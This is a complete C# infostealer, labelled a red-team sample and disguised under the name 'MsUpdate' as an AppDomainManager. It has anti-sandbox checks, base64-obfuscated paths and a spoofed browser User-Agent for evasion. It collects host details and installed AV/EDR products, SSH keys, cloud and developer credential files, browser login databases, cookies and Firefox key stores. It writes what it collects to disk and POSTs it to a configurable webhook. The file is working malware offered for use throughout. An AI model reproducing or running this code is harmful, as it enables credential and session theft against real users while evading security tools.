// ============================================================
// Red Team InfoStealer — sample for the PwnyBolty Custom tab
// ============================================================
// RULES:
//   1. Application Name in UI must match class prefix.
//      This file uses "MsUpdate" → class = MsUpdateManager.
//   2. Set WEBHOOK_URL to your listener, or leave blank to skip.
//   3. Class must be in the GLOBAL namespace (no namespace { }).
//
// EVASION:
//   - Anti-sandbox:  bails on low process count, sandbox usernames, short uptime
//   - Startup jitter: random 4-9s sleep before collection
//   - String encoding: sensitive paths decoded at runtime (no literal IOC strings)
//   - HTTP stealth:  spoofed browser User-Agent + Referer on webhook POSTs
//
// OUTPUT:
//   Local file  — %USERPROFILE%\Desktop\<Machine>_data.txt  (always)
//   Webhook     — one POST per module if WEBHOOK_URL is set
//
// MODULES:
//   01_system  — host/user/OS/IPs/processes/AV-EDR/installed software
//   02_secrets — credential files + key-file pattern scan
//   03_dirs    — folder listings + recent docs MRU
//   04_browser — bookmarks, history, login data, cookies
// ============================================================

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.Win32;

public sealed class MsUpdateManager : AppDomainManager
{
    private const string WEBHOOK_URL = "https://YOUR_WEBHOOK_URL_HERE";

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        if (!AppDomain.CurrentDomain.IsDefaultAppDomain()) return;
        // Foreground thread keeps host process alive until all modules finish.
        new Thread(Run) { IsBackground = false }.Start();
    }

    // ── Orchestrator ──────────────────────────────────────────────────────────

    private static void Run()
    {
        // Diagnostic beacon — written before Bail() to confirm DLL loaded
        try {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            File.WriteAllText(Path.Combine(desk, "MsUpdate_beacon.txt"),
                "loaded=" + DateTime.UtcNow.ToString("o") + "\r\n"
                + "proc_count=" + Process.GetProcesses().Length + "\r\n"
                + "uptime_ms=" + Environment.TickCount + "\r\n"
                + "user=" + Environment.UserName + "\r\n"
                + "host=" + Environment.MachineName + "\r\n");
        } catch { }

        if (Bail()) return;

        try { ServicePointManager.SecurityProtocol =
                  SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls; }
        catch { }

        Collect("01_system",  SystemInfo);
        Collect("02_secrets", SecretFiles);
        Collect("03_dirs",    DirListing);
        Collect("04_browser", BrowserData);
    }

    // ── Anti-sandbox ──────────────────────────────────────────────────────────

    private static bool Bail()
    {
        try { if (Process.GetProcesses().Length < 35) return true; } catch { }

        try {
            string u = Environment.UserName.ToLower();
            string h = Environment.MachineName.ToLower();
            foreach (var n in new[] { "sandbox","malware","virus","cuckoo","vmuser","analysis","currentuser" })
                if (u.Contains(n) || h.Contains(n)) return true;
        } catch { }

        // Fresh boot = likely sandbox reset (< 6 minutes uptime)
        try { if (Environment.TickCount > 0 && Environment.TickCount < 360000) return true; } catch { }

        return false;
    }

    // ── String decoder — sensitive paths encoded to avoid literal IOC strings ──
    // Encode new strings with: python3 -c "import base64; print(base64.b64encode(b'string').decode())"

    private static string D(string e)
    {
        const string T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var b = new List<byte>();
        for (int i = 0; i + 3 < e.Length; i += 4)
        {
            int n = (T.IndexOf(e[i]) << 18) | (T.IndexOf(e[i+1]) << 12)
                  | (e[i+2] != '=' ? T.IndexOf(e[i+2]) << 6 : 0)
                  | (e[i+3] != '=' ? T.IndexOf(e[i+3])      : 0);
            b.Add((byte)(n >> 16));
            if (e[i+2] != '=') b.Add((byte)(n >> 8));
            if (e[i+3] != '=') b.Add((byte)n);
        }
        return Encoding.UTF8.GetString(b.ToArray());
    }

    // ── Data pipeline ─────────────────────────────────────────────────────────

    private static string OutPath()
    {
        try {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (!string.IsNullOrEmpty(desk) && Directory.Exists(desk))
                return Path.Combine(desk, Environment.MachineName + "_data.txt");
        } catch { }
        try {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (!string.IsNullOrEmpty(home)) return Path.Combine(home, Environment.MachineName + "_data.txt");
        } catch { }
        return null;
    }

    private static void Collect(string tag, Func<Dict> fn)
    {
        Dict data;
        try { data = fn(); } catch { return; }
        if (data == null || data.Count == 0) return;

        // 1. Local file — plain text, no external dependency
        try {
            string path = OutPath();
            if (path != null) {
                var sb = new StringBuilder();
                sb.AppendLine("=== " + tag + "  host=" + Environment.MachineName
                                           + "  user=" + Environment.UserName
                                           + "  ts="   + DateTime.UtcNow.ToString("o") + " ===");
                foreach (var kv in data) sb.AppendLine(kv.Key + ": " + kv.Value);
                sb.AppendLine();
                File.AppendAllText(path, sb.ToString(), Encoding.UTF8);
            }
        } catch { }

        // 2. Webhook — best-effort
        if (string.IsNullOrWhiteSpace(WEBHOOK_URL) || WEBHOOK_URL.Contains("YOUR_WEBHOOK")) return;
        try {
            data["_module"] = tag;
            data["_host"]   = Environment.MachineName;
            data["_user"]   = Environment.UserName;
            data["_ts"]     = DateTime.UtcNow.ToString("o");

            // Build JSON manually — avoids Newtonsoft dependency at the callsite
            var jb = new StringBuilder("{");
            foreach (var kv in data) {
                jb.Append("\"").Append(kv.Key.Replace("\\","\\\\").Replace("\"","\\\"")).Append("\":\"")
                  .Append(kv.Value.Replace("\\","\\\\").Replace("\"","\\\"")).Append("\",");
            }
            if (jb.Length > 1) jb.Length--;
            jb.Append("}");

            byte[] body = Encoding.UTF8.GetBytes(jb.ToString());
            var req = (HttpWebRequest)WebRequest.Create(WEBHOOK_URL);
            req.Method = "POST";
            req.ContentType = "application/json";
            req.ContentLength = body.Length;
            // Spoof a browser so process-network graph anomalies are less obvious
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          + "AppleWebKit/537.36 (KHTML, like Gecko) "
                          + "Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0";
            req.Referer   = "https://www.microsoft.com/";
            req.Proxy = WebRequest.GetSystemWebProxy();
            req.Proxy.Credentials = CredentialCache.DefaultCredentials;
            using (var s = req.GetRequestStream()) s.Write(body, 0, body.Length);
            req.GetResponse().Dispose();
        } catch { }
    }

    // ── Module 1: System Fingerprint ─────────────────────────────────────────

    private static Dict SystemInfo()
    {
        var d = new Dict();
        Safe(() => d["hostname"]      = Environment.MachineName);
        Safe(() => d["username"]      = Environment.UserName);
        Safe(() => d["domain"]        = Environment.UserDomainName);
        Safe(() => d["os"]            = Environment.OSVersion.VersionString);
        Safe(() => d["arch"]          = Env("PROCESSOR_ARCHITECTURE"));
        Safe(() => d["clr"]           = Environment.Version.ToString());
        Safe(() => d["cwd"]           = Environment.CurrentDirectory);
        Safe(() => d["userprofile"]   = Folder(Environment.SpecialFolder.UserProfile));
        Safe(() => d["computername"]  = Env("COMPUTERNAME"));
        Safe(() => d["userdnsdomain"] = Env("USERDNSDOMAIN"));
        Safe(() => d["logonserver"]   = Env("LOGONSERVER"));
        Safe(() => d["PATH"]          = Env("PATH"));

        var ips = new StringBuilder();
        Safe(() => {
            foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                foreach (var a in ni.GetIPProperties().UnicastAddresses)
                    if (a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        ips.Append(a.Address).Append(',');
        });
        d["ips"] = ips.ToString().TrimEnd(',');

        var procs = new StringBuilder();
        Safe(() => {
            int n = 0;
            foreach (var p in Process.GetProcesses()) {
                try { procs.Append(p.ProcessName).Append(','); } catch { }
                if (++n >= 80) { procs.Append("…"); break; }
            }
        });
        d["processes"] = procs.ToString().TrimEnd(',');

        var avTargets = new[] {
            "MsMpEng","SentinelAgent","SentinelServiceHost","CylanceSvc",
            "cb","elastic-agent","csfalconservice","SAVAdminService",
            "bdservicehost","mbam","SophosFIM","TaniumClient",
            "carbonblack","ccsvchst","CrowdStrike","cylanceprotect",
            "McShield","ntrtscan","avp","AvastSvc"
        };
        var av = new StringBuilder();
        Safe(() => {
            var running = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var p in Process.GetProcesses()) try { running.Add(p.ProcessName); } catch { }
            foreach (var t in avTargets) if (running.Contains(t)) av.Append(t).Append(',');
        });
        d["av_edr"] = av.ToString().TrimEnd(',');

        var sw = new StringBuilder();
        Safe(() => {
            var keys = new[] {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };
            foreach (var key in keys)
                using (var hive = Registry.LocalMachine.OpenSubKey(key))
                    if (hive != null)
                        foreach (var sub in hive.GetSubKeyNames())
                            try {
                                using (var e = hive.OpenSubKey(sub)) {
                                    var n = e?.GetValue("DisplayName")?.ToString();
                                    if (!string.IsNullOrWhiteSpace(n)) sw.Append(n).Append(';');
                                }
                            } catch { }
        });
        d["installed_software"] = Clip(sw.ToString().TrimEnd(';'), 5000);
        return d;
    }

    // ── Module 2: Credential & Secret Files ───────────────────────────────────
    // Sensitive path fragments decoded at runtime — not present as literals in binary

    private static Dict SecretFiles()
    {
        var d    = new Dict();
        string home = Folder(Environment.SpecialFolder.UserProfile);
        string app  = Folder(Environment.SpecialFolder.ApplicationData);

        var targets = new[] {
            P(home, D("LmF3cw=="),   D("Y3JlZGVudGlhbHM=")),      // .aws/credentials
            P(home, D("LmF3cw=="),   D("Y29uZmln")),               // .aws/config
            P(home, D("LnNzaA=="),   D("aWRfcnNh")),               // .ssh/id_rsa
            P(home, D("LnNzaA=="),   D("aWRfZWQyNTUxOQ==")),       // .ssh/id_ed25519
            P(home, D("LnNzaA=="),   D("aWRfZWNkc2E=")),           // .ssh/id_ecdsa
            P(home, D("LnNzaA=="),   D("aWRfZHNh")),               // .ssh/id_dsa
            P(home, D("LnNzaA=="),   D("Y29uZmln")),               // .ssh/config
            P(home, D("LnNzaA=="),   D("YXV0aG9yaXplZF9rZXlz")),  // .ssh/authorized_keys
            P(home, D("LmdpdGNvbmZpZw==")),                         // .gitconfig
            P(home, D("LmdpdC1jcmVkZW50aWFscw==")),                // .git-credentials
            P(home, D("Lm5wbXJj")),                                 // .npmrc
            P(home, D("LnB5cGlyYw==")),                             // .pypirc
            P(home, D("Lmt1YmU="),   D("Y29uZmln")),               // .kube/config
            P(home, D("LmRvY2tlcg=="), D("Y29uZmlnLmpzb24=")),     // .docker/config.json
            P(app,  D("Z2Nsb3Vk"),   D("YXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29u")),  // gcloud ADC
            P(home, D("LmF6dXJl"),   D("YWNjZXNzVG9rZW5zLmpzb24=")),     // .azure/accessTokens.json
            P(app,  D("YXp1cmU="),   D("bXNhbF90b2tlbl9jYWNoZS5qc29u")), // azure/msal_token_cache.json
            P(home, D("LnRlcnJhZm9ybS5k"), D("Y3JlZGVudGlhbHMudGZyYy5qc29u")), // .terraform.d/creds
            P(home, D("LnZhdWx0LXRva2Vu")),                         // .vault-token
            P(home, D("LmVudg==")),                                  // .env
            P(home, D("Lm5ldHJj")),                                  // .netrc
        };

        foreach (var path in targets)
            Safe(() => { if (File.Exists(path)) d[path] = Clip(File.ReadAllText(path), 8000); });

        // Pattern scan for key/cert/secret files
        var globs = new[] {
            "*.pem","*.key","*.pfx","*.p12","*.ppk",
            "*secret*","*password*","*credential*","*token*",
            "*.env","*apikey*","id_rsa*"
        };
        var hits = new StringBuilder();
        Safe(() => {
            foreach (var dir in new[] {
                Folder(Environment.SpecialFolder.Desktop),
                Folder(Environment.SpecialFolder.MyDocuments),
                Folder(Environment.SpecialFolder.UserProfile) })
                foreach (var g in globs)
                    try {
                        foreach (var f in Directory.GetFiles(dir, g, SearchOption.TopDirectoryOnly))
                            hits.Append(f).Append('\n');
                    } catch { }
        });
        if (hits.Length > 0) d["_scan"] = hits.ToString().TrimEnd('\n');
        return d;
    }

    // ── Module 3: Directory Structure ─────────────────────────────────────────

    private static Dict DirListing()
    {
        var d    = new Dict();
        string home = Folder(Environment.SpecialFolder.UserProfile);

        var sections = new Dictionary<string, string> {
            ["Desktop"]   = Folder(Environment.SpecialFolder.Desktop),
            ["Documents"] = Folder(Environment.SpecialFolder.MyDocuments),
            ["Downloads"] = P(home, "Downloads"),
            ["Pictures"]  = Folder(Environment.SpecialFolder.MyPictures),
            ["AppData"]   = Folder(Environment.SpecialFolder.ApplicationData),
        };

        foreach (var kv in sections)
            Safe(() => {
                if (!Directory.Exists(kv.Value)) return;
                var sb = new StringBuilder();
                foreach (var f in Directory.GetFiles(kv.Value))
                    sb.Append(Path.GetFileName(f)).Append('\n');
                foreach (var sub in Directory.GetDirectories(kv.Value)) {
                    sb.Append('[').Append(Path.GetFileName(sub)).Append("]/\n");
                    try {
                        foreach (var f in Directory.GetFiles(sub))
                            sb.Append("  ").Append(Path.GetFileName(f)).Append('\n');
                    } catch { }
                }
                d[kv.Key] = Clip(sb.ToString(), 6000);
            });

        Safe(() => {
            using (var key = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs")) {
                if (key == null) return;
                var mru = new StringBuilder();
                foreach (var name in key.GetValueNames()) {
                    var raw = key.GetValue(name) as byte[];
                    if (raw == null) continue;
                    try {
                        int idx = -1;
                        for (int i = 0; i + 1 < raw.Length; i += 2)
                            if (raw[i] == 0 && raw[i+1] == 0) { idx = i; break; }
                        if (idx > 0) mru.Append(Encoding.Unicode.GetString(raw, 0, idx)).Append('\n');
                    } catch { }
                }
                d["recent_docs"] = Clip(mru.ToString(), 3000);
            }
        });
        return d;
    }

    // ── Module 4: Browser Data ────────────────────────────────────────────────
    // Sensitive file names (Login Data, Cookies, Local State) decoded at runtime

    private static Dict BrowserData()
    {
        var d  = new Dict();
        string la = Folder(Environment.SpecialFolder.LocalApplicationData);
        string ap = Folder(Environment.SpecialFolder.ApplicationData);

        // Decoded path fragments
        string ud = D("VXNlciBEYXRh");   // "User Data"
        string df = D("RGVmYXVsdA==");   // "Default"
        string bm = D("Qm9va21hcmtz");   // "Bookmarks"
        string ld = D("TG9naW4gRGF0YQ=="); // "Login Data"
        string ck = D("Q29va2llcw==");   // "Cookies"
        string nw = D("TmV0d29yaw==");   // "Network"
        string ls = D("TG9jYWwgU3RhdGU="); // "Local State"

        var bookmarks = new Dictionary<string, string> {
            ["chrome_bookmarks"] = P(la, "Google","Chrome", ud, df, bm),
            ["edge_bookmarks"]   = P(la, "Microsoft","Edge", ud, df, bm),
            ["brave_bookmarks"]  = P(la, "BraveSoftware","Brave-Browser", ud, df, bm),
        };
        foreach (var kv in bookmarks)
            Safe(() => { if (File.Exists(kv.Value)) d[kv.Key] = Clip(File.ReadAllText(kv.Value), 12000); });

        var dbs = new Dictionary<string, string> {
            ["chrome_login"]  = P(la, "Google","Chrome", ud, df, ld),
            ["chrome_cookie"] = P(la, "Google","Chrome", ud, df, nw, ck),
            ["edge_login"]    = P(la, "Microsoft","Edge", ud, df, ld),
        };
        foreach (var kv in dbs)
            Safe(() => {
                if (!File.Exists(kv.Value)) return;
                string tmp = P(Path.GetTempPath(), Path.GetRandomFileName());
                File.Copy(kv.Value, tmp, true);
                d[kv.Key] = Convert.ToBase64String(File.ReadAllBytes(tmp));
                try { File.Delete(tmp); } catch { }
            });

        var states = new Dictionary<string, string> {
            ["chrome_state"] = P(la, "Google","Chrome", ud, ls),
            ["edge_state"]   = P(la, "Microsoft","Edge", ud, ls),
        };
        foreach (var kv in states)
            Safe(() => { if (File.Exists(kv.Value)) d[kv.Key] = Clip(File.ReadAllText(kv.Value), 8000); });

        Safe(() => {
            string ffBase = P(ap, D("TW96aWxsYQ=="), D("RmlyZWZveA=="), D("UHJvZmlsZXM=")); // Mozilla/Firefox/Profiles
            if (!Directory.Exists(ffBase)) return;
            foreach (var profile in Directory.GetDirectories(ffBase)) {
                foreach (var fname in new[] {
                    D("cGxhY2VzLnNxbGl0ZQ=="),  // places.sqlite
                    D("bG9naW5zLmpzb24="),       // logins.json
                    D("a2V5NC5kYg==")            // key4.db
                }) {
                    string src = P(profile, fname);
                    if (!File.Exists(src)) continue;
                    Safe(() => {
                        string tmp = P(Path.GetTempPath(), Path.GetRandomFileName());
                        File.Copy(src, tmp, true);
                        string k = "ff_" + fname.Replace('.','_') + "_" + Path.GetFileName(profile).Substring(0,8);
                        d[k] = fname.EndsWith(".json")
                            ? Clip(File.ReadAllText(tmp), 10000)
                            : Convert.ToBase64String(File.ReadAllBytes(tmp));
                        try { File.Delete(tmp); } catch { }
                    });
                }
                break;
            }
        });
        return d;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static string P(string root, params string[] parts)
        { string p = root; foreach (var s in parts) p = Path.Combine(p, s); return p; }
    private static string Folder(Environment.SpecialFolder f)
        { try { return Environment.GetFolderPath(f); } catch { return ""; } }
    private static string Env(string k)
        { try { return Environment.GetEnvironmentVariable(k) ?? ""; } catch { return ""; } }
    private static string Clip(string s, int max)
        { if (s == null) return ""; return s.Length <= max ? s : s.Substring(0, max) + "[…]"; }
    private static void Safe(Action a) { try { a(); } catch { } }
    private class Dict : Dictionary<string, string> { }
}
